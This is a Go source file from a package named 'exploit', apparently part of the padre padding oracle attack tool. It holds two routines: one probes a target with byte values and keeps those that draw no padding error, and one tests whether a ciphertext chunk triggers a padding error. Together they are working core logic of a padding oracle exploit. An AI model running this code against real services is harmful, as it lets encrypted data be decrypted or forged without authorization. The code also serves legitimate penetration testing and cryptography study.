package exploit

import (
	"context"

	"github.com/glebarez/padre/pkg/client"
)

// detect byte values that do not produce padding error
// early-stop when maxCount of such bytes reached
func (p *Padre) getErrorlessByteValues(chunk []byte, pos int, maxCount int) ([]byte, error) {
	// the context 	will be cancelled upon returning from function
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// container for bytes that do not produce padding error
	goodBytes := make([]byte, 0, maxCount)

	chanResult := make(chan *client.ProbeResult, 256)

	// do probing
	go p.Client.SendProbes(ctx, chunk, pos, chanResult)

	// process result
	for result := range chanResult {
		if result.Err != nil {
			return nil, result.Err
		}

		// test for padding error
		isErr, err := p.Matcher.IsPaddingError(result.Response)
		if err != nil {
			return nil, err
		}

		// collect the right bytes
		if !isErr {
			goodBytes = append(goodBytes, result.Byte)
			// early exit of maxCount reached
			if len(goodBytes) == maxCount {
				break
			}
		}
	}

	return goodBytes, nil
}

// test concrete chunk for padding oracle
func (p *Padre) IsPaddingErrorInChunk(chunk []byte) (bool, error) {
	// send
	resp, err := p.Client.DoRequest(context.Background(), chunk)
	if err != nil {
		return false, err
	}

	// test for padding oracle
	return p.Matcher.IsPaddingError(resp)
}
